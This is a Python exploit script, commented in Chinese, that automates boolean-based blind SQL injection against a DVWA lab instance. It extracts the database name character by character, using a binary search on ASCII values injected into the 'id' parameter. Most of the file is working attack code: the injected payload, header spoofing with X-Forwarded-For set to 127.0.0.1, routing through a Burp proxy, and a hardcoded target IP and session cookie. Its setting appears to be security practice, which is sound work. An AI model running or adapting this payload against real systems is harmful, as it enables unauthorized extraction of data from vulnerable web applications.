#!/usr/bin/env python
#encoding=utf-8
# author:Unc1e

'''Boolean Sql Injection Exploit script, SQL盲注脚本(二分法)

盲注判断基于回显内容的差异, 即
        [True ]: User ID exists in the database.
        [False]: User ID is MISSING from the database.

此外, 在基于页面差异的布尔盲注中, 是否否出现指定关键词, 可用以下几种方法
        1' string.count(),  返回 str 在 string 里面出现的次数
        2' string.find(), 检测 str 是否包含在 string 中，如果是:返回第一个值的索引值(从0开始)，否则返回-1
        3' if (symbol_string in string) , 布尔值
        4' 页面大小, 即r.headers['Content-Length'] , 但要注意当'Transfer-Encoding'为'chunked'时, 响应头中无'Content-Length'
'''

import requests

def req(pos, _min, _max):
    '''封装的请求方法, 二分法
    @Param: pos     
    @Param: _min  
    @Param: _max                  
    '''
    DVWA = '121.36.134.150'
    TIMEOUT = 8
    burp0_cookies = {"PHPSESSID": "m9pshla2se8qfj7h3s79ur8f93", "security": "low"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4230.1 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-SG,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://DVWA/vulnerabilities/sqli_blind/?id=&Submit=Submit", "Upgrade-Insecure-Requests": "1", "X-Forwarded-For": "127.0.0.1", "X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1", "X-Remote-Addr": "127.0.0.1"}
    while True:
        mid = (_min + _max)//2
        if mid == _min:
            return chr(mid)

        QUERY =  "database()"
        words = "ASCII(MID(%s,%s,1))>=%s" % (QUERY, pos, mid)

        proxies = {"http":"127.0.0.1:8080"}
        burp0_url = "http://{DVWA}/vulnerabilities/sqli_blind/?id=0'or if(({words}),1,0)-- -&Submit=Submit".format(DVWA=DVWA, words=words)
        resp = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, timeout=TIMEOUT, proxies=proxies)
        if ("exists" in resp.text) and ("MISSING" not in resp.text):
            # True: [mid, max]
            _min = mid

        elif  ("MISSING" in resp.text) and ("exists" not in resp.text):
            # False: [min, mid]
            _max = mid



'''二分法: 
MID() 函数用于从文本字段中提取字符。
SQL MID() 语法
SELECT MID(column_name,start[,length]) FROM table_name;'''


# 内容长度, 用length()获取
LENGTH = 23
result = ''

for pos in range(1, LENGTH+1):
    
    result += req(pos, 32, 127)
    print(result)
        
